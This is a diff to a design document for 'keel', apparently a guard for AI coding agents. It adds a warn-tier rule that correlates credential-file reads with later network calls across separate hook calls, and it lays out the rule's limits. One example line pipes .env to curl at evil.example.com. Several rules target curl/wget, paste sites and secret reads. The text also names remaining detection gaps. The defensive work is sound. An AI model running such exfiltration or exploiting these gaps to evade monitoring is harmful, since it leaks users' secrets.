@@ -34,13 +34,14 @@ on top — keel does not compete with those and makes no claim to replace them.
 
 ## What ships
 
-Three rules in the default ruleset compose the mitigation, in increasing
+Four rules in the default ruleset compose the mitigation, in increasing
 order of severity:
 
 | rule | type | action | level | fires on |
 |---|---|---|---|---|
 | `paste-site-exfil` | command | prompt | sprint | `curl`/`wget` to a known paste-site host (pastebin, hastebin, transfer.sh, …), independent of any prior read |
 | `secret-file-read-without-egress` | command | warn | sprint | a Bash `cat`/`less`/`head`/`strings`/`xxd`/`base64` read of a credential-shaped path, regardless of what happens next |
+| `no-exfil-flow-cross-call` | flow | **warn** | sprint | the SAME read-then-sink pattern as `no-exfil-flow` below, but checked against a disk-persisted, session-scoped store instead of in-memory state — see "Cross-call correlation for `keel hook` hosts" below |
 | `no-exfil-flow` | flow | deny | **protect** | a session that reads a credential-shaped path, THEN later (same session, any turn) makes any network-shaped call |
 
 `no-exfil-flow` is the core of this mitigation: a `level: protect` floor,
@@ -81,32 +82,44 @@ tagged-source map is plain in-memory state — it is not one of
 paragraph above means "later in this session" or "never, because that
 process already exited" depends entirely on which integration is running:
 
-| integration | hosts | process model | cross-call correlation |
-|---|---|---|---|
-| `keel hook <host>` | Claude Code, Gemini CLI, Cursor, Codex, cline, generic | fresh process per tool call | **inert** — a read and a later network call are two different `FlowTracker` instances |
-| OpenCode plugin | OpenCode | one process, one `FlowTracker`, for the whole session | works as described above |
-| `keel daemon` | OpenClaw, Hermes (route through the daemon) | one long-lived process, one cached pipeline per `cwd` | works as described above |
+| integration | hosts | process model | `no-exfil-flow` (deny) correlation | `no-exfil-flow-cross-call` (warn) correlation |
+|---|---|---|---|---|
+| `keel hook <host>` | Claude Code, Gemini CLI, Cursor, Codex, cline, generic | fresh process per tool call | **inert beyond one command** (unchanged, see below) | **works, session-scoped, up to ~1 hour** — this is the b1-exfil lane's fix |
+| OpenCode plugin | OpenCode | one process, one `FlowTracker`, for the whole session | works as described above | also fires (redundantly — the in-memory correlation already caught it) |
+| `keel daemon` | OpenClaw, Hermes (route through the daemon) | one long-lived process, one cached pipeline per `cwd` | works as described above | also fires (redundantly, same reason) |
 
-For the `keel hook` row — most of keel's host coverage — `no-exfil-flow`
-still catches exactly one shape: a **single command that itself pipes a
-read verb into a network sink**, e.g. `cat .env | curl -d @- https://evil.example.com`,
-because `record()` (tags the source) and `check()` (checks the sink) both
-run against the *same* tool call in the *same* process. A native `Read`
-tool call on `.env` followed by a *separate* `Bash` call running `curl`,
+For the `keel hook` row — most of keel's host coverage — the **deny-tier**
+`no-exfil-flow` still catches exactly one shape: a **single command that
+itself pipes a read verb into a network sink**, e.g.
+`cat .env | curl -d @- https://evil.example.com`, because `record()` (tags
+the source) and `check()` (checks the sink) both run against the *same*
+tool call in the *same* process, purely in memory. A native `Read` tool
+call on `.env` followed by a *separate* `Bash` call running `curl`,
 `rsync`, or anything else — the shape most of this document otherwise
-describes — does not correlate for these hosts today. This was verified
-empirically, not inferred from reading the code: see
-`session/v1/EVIDENCE/m5-security.md`'s probes 1–4 and 7.
+describes — still does not correlate at deny/protect tier for these hosts.
+This was verified empirically, not inferred from reading the code: see
+`session/v1/EVIDENCE/m5-security.md`'s probes 1–4 and 7, and remains true
+after this lane — **`no-exfil-flow`'s own behavior was not touched.**
 
-This is a pre-existing architectural property of `keel hook`, not something
-this lane introduced or was asked to fix — `keel daemon`'s own docstring
-already states the long-term direction ("ONE engine, ONE runtime, thin
-clients... enforcement STATE live in exactly one process instead of being
-duplicated per integration"). Making `keel hook`'s callers correlate too
-would mean giving `FlowTracker` a disk-backed, locked, TTL'd, session-scoped
-store — the same shape `StateManager` already provides for other stateful
-rules — which is real, architectural follow-up work, not an additive
-hardening pass. See "Considered and deferred" below.
+What changed (b1-exfil lane): a new sibling rule, `no-exfil-flow-cross-call`
+(`action: warn`, `level: sprint`, `cross_call: true`), checks the identical
+`sources`/`sinks` list against `FlowTracker`'s new *persisted* correlation
+path instead of its in-memory one — see "Cross-call correlation for
+`keel hook` hosts, at warn tier" below for the design, and
+`session/v1/EVIDENCE/b1-exfil.md` for the verifying tests. The two-
+separate-tool-call pattern — a `Read` of `.env` in one `keel hook`
+invocation, a `Bash curl` in a later, separate invocation, same session —
+now DOES produce a signal on `keel hook` hosts. It is a `warn`, not a
+`deny`: see the tier rationale below for why that tradeoff was made
+deliberately, not as a lesser version of a fix that was really meant to be
+a hard block.
+
+This remains a partial, not complete, closure of the coverage gap. `keel
+daemon`'s own docstring still states the long-term architectural direction
+("ONE engine, ONE runtime, thin clients... enforcement STATE live in
+exactly one process instead of being duplicated per integration"); this
+lane adds a bounded, TTL'd, warn-tier correlation store to `FlowTracker`
+rather than that larger unification.
 
 ## Design choice: why this ships as `deny`/`protect`, not `observe`/`warn`
 
@@ -215,21 +228,100 @@ untouched as the historical record of that dated run. The rsync/scp closure
 above is verified independently, on fresh, reproducible probes, rather than
 retrofitted into an old measurement it cannot honestly reproduce.
 
-## Considered and deferred: disk-backed flow state for `keel hook`
+## Cross-call correlation for `keel hook` hosts, at warn tier (b1-exfil lane)
 
-The bigger fix implied by the coverage table above — giving `FlowTracker` a
-`StateManager`-backed store so `keel hook`'s per-call processes can
-correlate a read in one call with a sink in a later one — was not
-attempted in this lane. It needs real design, not a quick patch: what key
-scopes a tag (session id alone is attacker-influenced input on some hosts,
-per `enforce.ts`'s own comment on where `sessionId` comes from), how long a
-tag lives before expiring (an unbounded tag is a memory/disk leak; too
-short a TTL reopens the gap for a slow multi-turn read-then-exfil), and
-locking semantics for concurrent tool calls in the same session. This is
-exactly the kind of architectural, non-additive work `keel daemon`'s own
-docstring already points at as the long-term direction. Flagged here as
-the highest-leverage follow-up, not attempted because it is a different
-category of change than this lane's brief.
+The gap the previous section of this document used to describe as
+"considered and deferred" — giving `FlowTracker` a disk-backed store so
+`keel hook`'s per-call processes can correlate a read in one call with a
+sink in a later one — is now partially closed, at **warn tier only**. This
+section states exactly what was built, so a reader can tell precisely what
+changed and what did not.
+
+**Store design.** `PersistentFlowStore`
+(`packages/core/src/enforce/flow-store.ts`) is a new companion to
+`FlowTracker`'s existing in-memory `taggedValues` map, deliberately built by
+reusing patterns already shipped for other stateful rules rather than
+inventing new ones:
+
+- **Location / key**: one JSON file, `flow-tags.json`, under the same
+  `stateDir()` / `KEEL_STATE_DIR` / `resolveHome()` resolution
+  `StateManager` already uses (`state-manager.ts`) — so it lives at
+  `~/.keel/state/flow-tags.json` by default, and under a test's own
+  `KEEL_STATE_DIR` when set. Tags are keyed by the caller's `session_id`
+  exactly the way `overrides.ts`'s `mode: session` override already keys
+  by it — this store does not add any further authentication of that
+  value. `session_id` is host-supplied input (`enforce.ts`'s own comment
+  on where it comes from is the honest caveat: on some hosts it is not
+  independently verified either), so this store inherits that same
+  trust boundary rather than closing it — a different problem, out of
+  scope for this lane, and worth stating plainly rather than implying the
+  new store is more trustworthy than the value it is keyed on.
+- **Locking**: every read-modify-write cycle (`recordTag`) runs under
+  `withFileLock`/`acquireLock` (`file-lock.ts`) — the exact lock
+  `StateManager` and `overrides.ts` already use, including its stale-lock
+  reclaim and its documented fail-safe (a lock that cannot be acquired
+  within its bounded timeout still runs the mutation, unlocked, rather
+  than skipping it or hanging the hook). Verified under real concurrent
+  OS processes, not just in-process, in
+  `packages/core/src/enforce/__tests__/flow-store-concurrency.test.ts`
+  (mirrors `state-manager-concurrency.test.ts`'s method exactly).
+- **TTL**: `FLOW_TAG_TTL_MS = 1 hour`. Long enough to span a realistic
+  multi-turn agent session (read a token early, act on it many turns
+  later) without keeping a stale tag alive indefinitely; enforced on both
+  write (pruned before every persist) and read (filtered again on every
+  `getTags`), so an idle session's tags age out even if nothing else ever
+  touches that session again.
+- **Bounds**: `MAX_TAGS_PER_SESSION = 50` (per session) and
+  `MAX_SESSIONS = 200` (distinct sessions retained, least-recently-active
+  evicted first) — an on-disk equivalent of `FlowTracker`'s own
+  in-memory "keep last 1000" cap, so the file cannot grow without limit
+  even inside the TTL window.
+- **Fail-safety**: a lock timeout, a corrupt file, or any other read/write
+  failure degrades to "no correlation this call" — `recordTag` becomes a
+  no-op, `getTags` returns `[]` — never a thrown exception that could
+  crash a hook invocation, and never a hang. This is safe specifically
+  *because* the store backs a warn/observe-tier rule, not a deny floor —
+  see the fail-safe doc comment on `PersistentFlowStore` itself for the
+  explicit statement that it must never be reused to back a
+  `level: protect` rule under this same fail-open-on-corruption posture.
+
+**Wiring**: `packages/cli/src/commands/enforce.ts`'s `initEnforce()` — the
+single choke point behind `keel hook`, `keel test`, and `keel evaluate` —
+now constructs `FlowTracker` with a `PersistentFlowStore`, on by default
+(no flag). The OpenCode plugin and `keel daemon` construct their own
+`FlowTracker` directly and were not changed — they already correlate in
+memory for the whole session and do not need this.
+
+**Tier**: shipped as a *separate* rule, `no-exfil-flow-cross-call`
+(`action: warn`, `level: sprint`), not as a change to `no-exfil-flow`
+itself, and not as `deny`. This was a deliberate choice, not a lesser
+version of a fix that was really meant to be a hard block: the
+false-positive window for a persisted, cross-process correlation is the
+store's TTL (up to an hour, across MULTIPLE separate tool-call processes),
+not one live command — materially wider than `no-exfil-flow`'s own already-
+accepted false-positive surface (see "The false-positive surface" above).
+A legitimate build that reads a token in one hook call and hits the network
+in a later, unrelated one is a routine shape, not an edge case; hard-
+blocking it by default would trade a real, common workflow interruption for
+a warn-tier signal that already exists in `secret-file-read-without-egress`
+and now also on the sink side.
+`no-exfil-flow`'s own deny/protect behavior is completely unchanged by this
+lane — see the previous section's "was not touched" note.
+
+**What this does NOT close**: the deny-tier gap. A session that reads a
+credential in one `keel hook` call and exfiltrates it in a later, separate
+one on these hosts still only gets a `warn`, not a `deny` — the hard
+block described by `no-exfil-flow`'s own rationale still only fires within
+one live process or one piped command on `keel hook` hosts, exactly as
+before this lane. Closing THAT gap — promoting the cross-call correlation
+itself to a deny/protect floor — was explicitly out of scope: the design
+questions the earlier draft of this section raised (session-id trust,
+TTL sizing, locking) are answered above for the warn-tier version, but
+promoting to deny would need the false-positive rate actually measured
+against real workflows first, not asserted from a design review, given
+that a floor-level failure mode is a much more expensive mistake than a
+warn-level one. Flagged here as the next honest increment, not attempted
+in this lane.
 
 ## Considered and deferred: one-repo-per-session
 
@@ -262,10 +354,16 @@ repo's secrets on the same machine) that remains open, not quietly dropped.
 - **No payload correlation**, as detailed above — session-level taint only.
 - **Single-command combined read+send** (`curl -d @secretfile`), as detailed
   above.
-- **No cross-process correlation for `keel hook` hosts** (Claude Code,
-  Gemini CLI, Cursor, Codex, cline, generic) — see "Coverage depends on
-  which host integration you use" above. This is the biggest practical gap
-  in this document for most installs and is not fixed by this lane.
+- **No cross-process correlation at DENY tier for `keel hook` hosts**
+  (Claude Code, Gemini CLI, Cursor, Codex, cline, generic) — see "Coverage
+  depends on which host integration you use" above. The b1-exfil lane added
+  a warn-tier version (`no-exfil-flow-cross-call`, session-scoped, TTL'd,
+  disk-persisted), which DOES now fire across separate `keel hook`
+  processes; the hard-block `no-exfil-flow` rule itself still does not —
+  it remains scoped to one live process or one piped command on these
+  hosts, same as before this lane. Do not read the new warn-tier rule as
+  closing this gap; it is a lower-friction, lower-confidence signal
+  layered next to the still-open one, not a replacement for it.
 - **Non-file-path sources.** A secret pasted directly into the conversation
   by the user, fetched via an MCP tool call, or read from a database is
   invisible to `FlowTracker`'s `sources` matching — it only tags file-path
@@ -286,12 +384,22 @@ repo's secrets on the same machine) that remains open, not quietly dropped.
 ## Bottom line
 
 This is a mitigation against one specific, narrow pattern: an agent that
-reads a credential-shaped file and later, in the same live process, does
-something network-shaped. It is not a prompt-injection defense, not a
-general data-loss-prevention system, and not a claim that exfiltration is
-"solved" — and on the CLI-hook hosts most installs actually use, "later"
-means "later in the same single command," not "later in the session,"
-until the disk-backed follow-up above lands. Treat a `no-exfil-flow`
-denial as a real interruption worth looking at, and treat the absence of
-one as no evidence of safety beyond this specific pattern, on this
-specific host integration.
+reads a credential-shaped file and later does something network-shaped.
+It is not a prompt-injection defense — that remains completely unsolved by
+keel, restated here because it is the single most important limit in this
+document — not a general data-loss-prevention system, and not a claim that
+exfiltration is "solved."
+
+On the CLI-hook hosts most installs actually use, "later" means two
+different things depending on which rule you are looking at, and the
+distinction matters: for the hard-block `no-exfil-flow`, "later" still
+means "later in the same single command" — that did not change in the
+b1-exfil lane. For the new warn-tier `no-exfil-flow-cross-call`, "later"
+now genuinely means "later in the session," across separate `keel hook`
+processes, bounded by the persisted store's ~1-hour TTL. Treat a
+`no-exfil-flow` denial as a real interruption worth looking at; treat a
+`no-exfil-flow-cross-call` warning as a lower-confidence, higher-noise
+signal worth a glance, not an incident — its false-positive window is
+wide by design (see "The false-positive surface" and the tier rationale
+above). Treat the absence of either as no evidence of safety beyond the
+specific pattern each one checks, on the specific host integration in use.
